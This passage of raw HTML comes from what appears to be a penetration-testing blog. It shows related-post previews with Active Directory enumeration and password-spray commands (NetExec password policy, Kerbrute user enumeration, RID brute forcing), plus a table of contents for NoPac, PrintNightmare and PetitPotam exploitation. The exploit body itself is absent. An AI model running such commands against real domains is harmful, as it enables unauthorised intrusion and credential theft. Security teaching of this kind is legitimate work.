is to identify users, groups, trusts, shares, security controls, and privilege escalation paths that can be leveraged during the engagement.  Enumerating Security Controls ➜ Before executing offensive tooling, identify the security controls deployed in the environment, this helps determine which techniques are likely to be detected or blocked.   Microsoft Defender...</div></div></div></a><a class="pagination-related" href="/2026/07/06/Domain-and-ACLs/" title="Domain and ACLs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-06</div><div class="info-item-2">Domain and ACLs</div></div><div class="info-2"><div class="info-item-1"> ➜ Enumerate the domain itself (info + password policy) and the Access Control Lists that reveal who can act on whom.  Domain InformationAD Module1Import-Module ActiveDirectory   ➜ Pull domain details  1Get-ADDomain  PowerView ➜ Pull the domain objects  1Get-Domain  LOTL ➜ Read the domain the host is joined to.  1wmic ntdomain get  Password PolicyNetExec ➜ Pull the password policy with a credential.  1nxc smb &lt;DC_IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --pass-pol  rpcclient ➜ Read the polic...</div></div></div></a><a class="pagination-related" href="/2026/06/29/Password-Attacks/" title="Password Attacks"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-29</div><div class="info-item-2">Password Attacks</div></div><div class="info-2"><div class="info-item-1"> ➜ Password attacks are one of the most common ways to obtain an initial domain credential. Before attempting any password spray, we should enumerate the domain password policy to avoid locking user accounts. Once the policy is known, we can build a list of valid usernames and perform a controlled password spray against the domain.  Enumerating the Password Policy ➜ Before spraying passwords, identify the domain’s password and account lockout policy, the most important values are the lockout ...</div></div></div></a><a class="pagination-related" href="/2026/07/06/Users-Groups/" title="Users &amp; Groups"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-06</div><div class="info-item-2">Users &amp; Groups</div></div><div class="info-2"><div class="info-item-1"> ➜ Enumerate domain users and groups from the DC directly (null&#x2F;anonymous) or credentialed  UsersUsername Wordlist ➜ Turn real names into username  1./username-anarchy -i &lt;names-file&gt;  Kerbrute ➜ Validate usernames using Kerberos pre-auth (low-noise, no credential needed).  1kerbrute userenum -d &lt;DOMAIN&gt; --dc &lt;DC_IP&gt; &lt;wordlist&gt;  RID Brute ➜ Enumerate users via RID cycling.  1nxc smb &lt;DC_IP&gt; -u guest -p &#x27;&#x27; --rid-brute  List Domain Users ➜ List all d...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Twistzz</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">417</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">66</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Twistzz-cb" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NoPac-CVE-2021-42278-42287"><span class="toc-number">1.</span> <span class="toc-text">NoPac (CVE-2021-42278 &#x2F; 42287)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Setup"><span class="toc-number">1.1.</span> <span class="toc-text">Setup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Clone-NoPac"><span class="toc-number">1.1.1.</span> <span class="toc-text">Clone NoPac</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.2.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Scan-Whether-the-Domain-Is-Vulnerable"><span class="toc-number">1.2.1.</span> <span class="toc-text">Scan Whether the Domain Is Vulnerable</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Pop-a-SYSTEM-Shell-on-the-DC"><span class="toc-number">1.2.2.</span> <span class="toc-text">Pop a SYSTEM Shell on the DC</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DCSync-Straight-to-a-Dump"><span class="toc-number">1.2.3.</span> <span class="toc-text">DCSync Straight to a Dump</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrintNightmare-CVE-2021-1675-34527"><span class="toc-number">2.</span> <span class="toc-text">PrintNightmare (CVE-2021-1675 &#x2F; 34527)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Setup-1"><span class="toc-number">2.1.</span> <span class="toc-text">Setup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Clone-the-Exploit"><span class="toc-number">2.1.1.</span> <span class="toc-text">Clone the Exploit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Remove-the-Default-Impacket"><span class="toc-number">2.1.2.</span> <span class="toc-text">Remove the Default Impacket</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Clone-cube0x0%E2%80%99s-Impacket"><span class="toc-number">2.1.3.</span> <span class="toc-text">Clone cube0x0’s Impacket</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Install-cube0x0%E2%80%99s-Impacket"><span class="toc-number">2.1.4.</span> <span class="toc-text">Install cube0x0’s Impacket</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploitation-1"><span class="toc-number">2.2.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Confirm-the-Spooler-RPC-Interface-Is-Reachable"><span class="toc-number">2.2.1.</span> <span class="toc-text">Confirm the Spooler RPC Interface Is Reachable</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Generate-the-Payload-DLL"><span class="toc-number">2.2.2.</span> <span class="toc-text">Generate the Payload DLL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Host-the-DLL-on-an-SMB-Share"><span class="toc-number">2.2.3.</span> <span class="toc-text">Host the DLL on an SMB Share</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fire-the-Exploit"><span class="toc-number">2.2.4.</span> <span class="toc-text">Fire the Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PetitPotam-%E2%86%92-ADCS-Relay-CVE-2021-36942"><span class="toc-number">3.</span> <span class="toc-text">PetitPotam → ADCS Relay (CVE-2021-36942)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-Path"><span class="toc-number">3.1.</span> <span class="toc-text">Linux Path</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Relay-the-DC-Auth-to-the-CA"><span class="toc-number">3.1.1.</span> <span class="toc-text">Relay the DC Auth to the CA</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Coerce-the-DC-to-Authenticate"><span class="toc-number">3.1.2.</span> <span class="toc-text">Coerce the DC to Authenticate</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Request-a-TGT-via-PKINIT"><span class="toc-number">3.1.3.</span> <span class="toc-text">Request a TGT via PKINIT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Export-the-Ticket"><span class="toc-number">3.1.4.</span> <span class="toc-text">Export the Ticket</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DCSync-the-Domain"><span class="toc-number">3.1.5.</span> <span class="toc-text">DCSync the Domain</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Alternative-%E2%80%94-Recover-the-DC%E2%80%99s-NT-Hash"><span class="toc-number">3.2.</span> <span class="toc-text">Alternative — Recover the DC’s NT Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Extract-the-NT-Hash"><span class="toc-number">3.2.1.</span> <span class="toc-text">Extract the NT Hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Validate-via-Pass-the-Hash"><span class="toc-number">3.2.2.</span> <span class="toc-text">Validate via Pass-the-Hash</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-Path"><span class="toc-number">3.3.</span> <span class="toc-text">Windows Path</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Request-a-TGT-with-Rubeus"><span class="toc-number">3.3.1.</span> <span class="toc-text">Request a TGT with Rubeus</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DCSync-with-Mimikatz"><span class="toc-number">3.3.2.</span> <span class="toc-text">DCSync with Mimikatz</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/07/Abusing-Foreign-Group-Membership/" title="Abusing Foreign Group Membership">Abusing Foreign Group Membership</a><time datetime="2026-07-07T07:29:09.000Z" title="Created 2026-07-07 08:29:09">2026-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Forest-Trust-Enumeration/" title="Forest Trust Enumeration">Forest Trust Enumeration</a><time datetime="2026-07-06T14:00:25.000Z" title="Created 2026-07-06 15:00:25">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Child-Parent-Trust-Enumeration/" title="Child-Parent Trust Enumeration">Child-Parent Trust Enumeration</a><time datetime="2026-07-06T13:42:32.000Z" title="Created 2026-07-06 14:42:32">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Users-Groups/" title="Users &amp; Groups">Users &amp; Groups</a><time datetime="2026-07-06T13:13:08.000Z" title="Created 2026-07-06 14:13:08">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Domain-and-ACLs/" title="Domain and ACLs">Domain and ACLs</a><time datetime="2026-07-06T12:24:06.000Z" title="Created 2026-07-06 13:24:06">2026-07-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Twistzz</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>
